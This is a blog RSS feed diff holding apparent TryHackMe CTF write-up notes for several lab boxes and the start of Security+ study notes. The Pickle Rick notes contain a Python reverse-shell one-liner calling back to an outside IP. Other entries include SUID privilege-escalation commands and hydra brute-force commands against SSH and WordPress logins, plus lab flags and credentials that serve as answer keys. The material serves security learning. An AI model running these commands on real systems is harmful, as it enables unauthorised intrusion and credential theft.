+      <link>http://localhost:1313/rootme/</link>
+      <pubDate>Sun, 18 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/rootme/</guid>
+      <description>&lt;p&gt;A ctf for beginners, can you root me?&lt;/p&gt;
+&lt;h2 id=&#34;questions&#34;&gt;Questions&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;Scan the machine, how many ports are open? &lt;code&gt;2&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What version of Apache is running? &lt;code&gt;2.4.29&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What service is running on port 22? &lt;code&gt;ssh&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What is the hidden directory? &lt;code&gt;/panel/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Flag in user.txt? &lt;code&gt;THM{y0u_g0t_a_sh3ll}&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Search for files with SUID permission, which file is weird? &lt;code&gt;/usr/bin/python&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Flag in root.txt? &amp;lsquo;THM{pr1v1l3g3_3sc4l4t10n}&amp;rsquo;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;notes&#34;&gt;Notes&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;IP = 10.10.119.146&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;exposed-services&#34;&gt;Exposed Services&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;userspasswords&#34;&gt;Users:Passwords&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;vulnerabilities&#34;&gt;Vulnerabilities&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;unrestricted file uploads
+&lt;ul&gt;
+&lt;li&gt;does not allow .php&lt;/li&gt;
+&lt;li&gt;used .php5&lt;/li&gt;
+&lt;li&gt;uploaded php reverse shell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;commands&#34;&gt;Commands&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;ping $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo nmap -sC -sV -oN scans/initial $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;gobuster dir -u http://10.10.119.146 -w /usr/local/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;privilege escalation
+&lt;code&gt;python -c &#39;import os; os.execl(&amp;quot;/bin/sh&amp;quot;, &amp;quot;sh&amp;quot;, &amp;quot;-p&amp;quot;)&#39;&lt;/code&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Simple Ctf</title>
+      <link>http://localhost:1313/simple-ctf/</link>
+      <pubDate>Sun, 18 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/simple-ctf/</guid>
+      <description>&lt;p&gt;Beginner level ctf&lt;/p&gt;
+&lt;h2 id=&#34;questions&#34;&gt;Questions&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;How many services are running under port 1000? &lt;code&gt;2&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What is running on the higher port? &lt;code&gt;ssh&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What&amp;rsquo;s the CVE you&amp;rsquo;re using against the application? &lt;code&gt;CVE-2019-9053&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;To what kind of vulnerability is the application vulnerable? &lt;code&gt;SQLi&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What&amp;rsquo;s the password? &lt;code&gt;secret&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Where can you login with the details obtained? &lt;code&gt;ssh&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What&amp;rsquo;s the user flag? &lt;code&gt;G00d j0b, keep up!&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Is there any other user in the home directory? What&amp;rsquo;s its name? &lt;code&gt;sunbath&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What can you leverage to spawn a privileged shell? &lt;code&gt;vim&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What&amp;rsquo;s the root flag? &lt;code&gt;W3ll d0n3. You made it!&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;notes&#34;&gt;Notes&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;IP = 10.10.123.106&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;exposed-services&#34;&gt;Exposed Services&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;21&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;2222&lt;/span&gt; ssh
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;userspasswords&#34;&gt;Users:Passwords&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;mitch:secret
+&lt;ul&gt;
+&lt;li&gt;username found via 46635.py script&lt;/li&gt;
+&lt;li&gt;password found via hydra&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;vulnerabilities&#34;&gt;Vulnerabilities&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;CVE-2019-9053
+&lt;ul&gt;
+&lt;li&gt;found via $IP/simple&lt;/li&gt;
+&lt;li&gt;CMS Made Simple version 2.2.8&lt;/li&gt;
+&lt;li&gt;exploitdb 46635.py&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;46635py&#34;&gt;46635.py&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Salt &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; password found: 1dac0d92e9fa6bb2
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Username found: mitch
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Email found: admin@admin.com
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;hash.txt
+&lt;code&gt;0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;commands&#34;&gt;Commands&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;ping $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo nmap -sC -sV -p 1-1000 -oN scans/initial $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo nmap -sC -sV -oN scans/common 10.10.123.106&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo nmap --script=vuln 10.10.123.106&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;gobuster dir -u http://10.10.123.106 -w /usr/local/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;hashcat -m 20 -a 0 hash.txt /usr/local/share/wordlists/rockyou.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;hydra -v -l mitch -P /usr/local/share/wordlists/rockyou.txt -s 2222 10.10.123.106 ssh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo -l #found vim&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo vim /root #found root.txt&lt;/code&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Wonderland</title>
+      <link>http://localhost:1313/wonderland/</link>
+      <pubDate>Sun, 18 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/wonderland/</guid>
+      <description>&lt;h2 id=&#34;questions&#34;&gt;Questions&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;Obtain the flag in user.txt &lt;code&gt;thm{&amp;quot;Curiouser and curiouser!&amp;quot;}&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Escalate your privileges, what is the flag in root.txt? &lt;code&gt;thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;notes&#34;&gt;Notes&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;IP = 10.10.59.87&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;exposed-services&#34;&gt;Exposed Services&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;userspasswords&#34;&gt;Users:Passwords&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;alice:HowDothTheLittleCrocodileImproveHisShiningTail&lt;/li&gt;
+&lt;li&gt;hatter:WhyIsARavenLikeAWritingDesk?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;vulnerabilities&#34;&gt;Vulnerabilities&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;CVE-2021-4034&lt;/li&gt;
+&lt;li&gt;CVE-2022-2588&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;flags&#34;&gt;Flags&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Found flag one via &lt;code&gt;cat /root/user.txt&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;found password.txt: WhyIsARavenLikeAWritingDesk?&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;commands&#34;&gt;Commands&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;ping $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo nmap -sC -sV -oN scans/initial $IP&lt;/code&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Basic Pentesting</title>
+      <link>http://localhost:1313/basic-pentesting/</link>
+      <pubDate>Sat, 17 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/basic-pentesting/</guid>
+      <description>&lt;p&gt;This is a machine that allows you to practice web app hacking and privilege escalation&lt;/p&gt;
+&lt;h2 id=&#34;questions&#34;&gt;Questions&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;What is the name of the hidden directory on the web server(enter name without /)?
+&lt;code&gt;/development&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What is the username?
+&lt;code&gt;jan&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What is the password?
+&lt;code&gt;armando&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What service do you use to access the server(answer in abbreviation in all caps)?
+&lt;code&gt;SSH&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What is the name of the other user you found(all lower case)?
+&lt;code&gt;kay&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What is the final password you obtain?
+&lt;code&gt;heresareallystrongpasswordthatfollowsthepasswordpolicy$$&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;notes&#34;&gt;Notes&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;IP = 10.10.39.178&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;exposed-services&#34;&gt;Exposed Services&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;139&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;8009&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;8080&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;userspasswords&#34;&gt;Users:Passwords&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;jan:armando
+&lt;ul&gt;
+&lt;li&gt;found via hydra&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;kay:beeswax
+&lt;ul&gt;
+&lt;li&gt;foudn via JohnTheRipper from id_rsa&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;vulnerabilities&#34;&gt;Vulnerabilities&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;CVE-2021-4034&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;commands&#34;&gt;Commands&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;sudo nmap -sC -sV -oN scans/initial 10.10.39.178&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;gobuster dir -u http://10.10.39.178:80 -w /usr/local/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;enum4linux -a 10.10.39.178 | tee enum4linux.log&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;hydra -v -l jan -P /usr/local/share/wordlists/rockyou.txt 10.10.39.178 ssh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;linpeas.sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ssh2john id_rsa &amp;gt; forjohn&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;john --wordlist=/usr/share/wordlists/rockyou.txt forjohn&lt;/code&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Mr Robot</title>
+      <link>http://localhost:1313/mr-robot/</link>
+      <pubDate>Sat, 17 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/mr-robot/</guid>
+      <description>&lt;p&gt;Based on the Mr. Robot show, can you root this box?&lt;/p&gt;
+&lt;h2 id=&#34;questions&#34;&gt;Questions&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;What is key 1? &lt;code&gt;073403c8a58a1f80d943455fb30724b9&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What is key 2? &lt;code&gt;822c73956184f694993bede3eb39f959&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What is key 3? &lt;code&gt;04787ddef27c3dee1ee161b21670b4e4&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;notes&#34;&gt;Notes&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;IP = 10.10.2.159&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;visited http://IP&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;visited http://IP/robots.txt&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;found fsocity.dic&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;found key-1-of-3.txt&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;WordPress&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;use hydra
+&lt;ul&gt;
+&lt;li&gt;Username: Elliot&lt;/li&gt;
+&lt;li&gt;Password: ER28-0652&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;WordPress Themes&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;php reverse shell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Spawn TTY&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;python -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Hash MD5 to get robot password&lt;/p&gt;
+&lt;p&gt;No sudo privileges
+Find SUID flags&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;find / -type f -perm -04000 -ls 2&amp;gt;/dev/null&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Abuse nmap&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;nmap --interactive&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;!sh&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;exposed-services&#34;&gt;Exposed Services&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;userspasswords&#34;&gt;Users:Passwords&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Elliot:ER28-0652&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;vulnerabilities&#34;&gt;Vulnerabilities&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;commands&#34;&gt;Commands&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;ping $IP&lt;/code&gt;
+&lt;code&gt;sudo nmap -sC -sV -oN nmap/initial 10.10.2.159&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;wget http://10.10.2.159/key-1-of-3.txt&lt;/code&gt;
+&lt;code&gt;wget http://10.10.2.159/fsocity.dic&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;hydra -v -t 30 -L fsocity.dic -p test 10.10.2.159 http-post-form &amp;quot;/wp-login.php:log=^USER^&amp;amp;pwd=^PASS^:Invalid username&amp;quot;&lt;/code&gt;
+&lt;code&gt;hydra -v -t 30 -l Elliot -P fsocity.dic 10.10.2.159 http-post-form &amp;quot;/wp-login.php:log=^USER^&amp;amp;pwd=^PASS^:The password you entered for the username&amp;quot;&lt;/code&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Pickle Rick</title>
+      <link>http://localhost:1313/pickle-rick/</link>
+      <pubDate>Sat, 17 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/pickle-rick/</guid>
+      <description>&lt;p&gt;A Rick and Morty CTF. Help turn Rick back into a human!&lt;/p&gt;
+&lt;h2 id=&#34;questions&#34;&gt;Questions&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;What is the first ingredient Rick needs? &lt;code&gt;mr. meeseek hair&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What is the second ingredient Rick needs? &lt;code&gt;1 jerry tear&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;What is the final ingredient Rick needs? &lt;code&gt;fleeb juice&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;notes&#34;&gt;Notes&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;IP = 10.10.141.98&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;website page source shows &lt;code&gt;/assets&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;found Apache/2.4.18 (Ubuntu) Server&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;found &lt;code&gt;/login.php&lt;/code&gt; from nmap &amp;ndash;script=vuln scan&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;attempt bruteforce with hydra&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;exposed-services&#34;&gt;Exposed Services&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;userspasswords&#34;&gt;Users:Passwords&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;R1ckRul3s:Wubbalubbadubdub
+&lt;ul&gt;
+&lt;li&gt;found username via web page source in notes&lt;/li&gt;
+&lt;li&gt;found password on robots.txt&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;vulnerabilities&#34;&gt;Vulnerabilities&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;logged-into-web-portal&#34;&gt;Logged Into Web Portal&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;ls&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;base64 Sup3rS3cretPickl3Ingred.txt | base64 -d&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;base64 /home/rick/second\ ingredients | base64 -d&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;reverse-shell&#34;&gt;Reverse Shell&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;python3 -c &#39;import os,pty,socket;s=socket.socket();s.connect((&amp;quot;10.18.53.113&amp;quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&amp;quot;bash&amp;quot;)&#39;&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;sudo cat /home/ubuntu/.bash_history&lt;/code&gt; : &lt;code&gt;3rd ingredients: fleeb juice&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;commands&#34;&gt;Commands&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;ping $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo nmap -sC -sV -oN scans/initial $IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;gobuster dir -u http://10.10.141.98 -w /usr/local/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;hydra -v -t 30 -l R1ckRul3s -P /usr/local/share/wordlists/rockyou.txt 10.10.141.98 http-post-form &amp;quot;/login.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;sub=Login:Invalid username or password&amp;quot;&lt;/code&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Comptia Security&#43;</title>
+      <link>http://localhost:1313/comptia-security-plus/</link>
+      <pubDate>Sat, 01 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/comptia-security-plus/</guid>
+      <description>&lt;h2 id=&#34;general-information&#34;&gt;General Information&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;CSR
+&lt;ul&gt;
+&lt;li&gt;CSEPOOLCSK&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Encryption Alogorithms
+&lt;ul&gt;
+&lt;li&gt;RED fishES
+&amp;ndash;A&amp;mdash;&amp;ndash;S
+&amp;mdash;&amp;ndash;H&lt;/li&gt;
+&lt;li&gt;Don&amp;rsquo;t smoke HASH, have some integrity&lt;/li&gt;
+&lt;li&gt;Everything else is for confidentiality&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Cyber Attack Identification
+&lt;ul&gt;
+&lt;li&gt;cookies = XSS = enable input validation&lt;/li&gt;
+&lt;li&gt;DNS = DNS Poisoning = Use DNSSEC for DNS integrity&lt;/li&gt;
+&lt;li&gt;multiple sources = Botnet = activate DDoS protection&lt;/li&gt;
+&lt;li&gt;spoofing = smurf = disable ip-directed broadcasts at the router&lt;/li&gt;
+&lt;li&gt;ping | maximum = ping of death = use a firewall to check fragmental IP packets for maximum size&lt;/li&gt;
+&lt;li&gt;remotely = RAT = disable remote access services&lt;/li&gt;
+&lt;li&gt;saves old messages = session replay attack = use session timestamps&lt;/li&gt;
+&lt;li&gt;self-propogating | exploit default = worm = change default app passwords&lt;/li&gt;
+&lt;li&gt;personal = spear phishing = analyze email headers&lt;/li&gt;
+&lt;li&gt;hardware device = keylogger = 2FA or MFA&lt;/li&gt;
+&lt;li&gt;malicious scripts pages = watering hole = input validation&lt;/li&gt;
+&lt;li&gt;hidden access = backdoor = execute code review&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;MITRE ATT&amp;amp;CK Framework
+&lt;ul&gt;
+&lt;li&gt;RW DEICE
